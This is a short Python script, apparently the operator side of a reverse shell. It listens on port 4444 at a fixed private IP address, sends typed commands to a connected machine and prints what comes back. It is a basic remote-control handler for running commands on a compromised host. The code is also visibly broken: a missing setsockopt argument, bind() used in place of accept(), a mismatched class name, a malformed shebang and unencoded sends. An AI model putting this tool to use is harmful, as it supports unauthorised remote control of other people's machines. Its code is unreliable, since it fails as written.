#!usr/bin/python

import socket

ip = "192.168.10.8"
port = 4444

class Listener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR)
        self.connection, address = listener.bind((ip,port))
        print("[-] Waiting for incomming connection.")
        listener.listen(0)
        print(f"[+] Successfully connected to : {address}")
    
    def exe_remort(self,command):
        self.connection.send(command)
        return self.connection.recv(1024)

    def run(self):
        while True:
            command = input(">> ")
            result = self.exe_remort(command)
            print(result)

listener_on = listener(ip,port)
listener_on.run()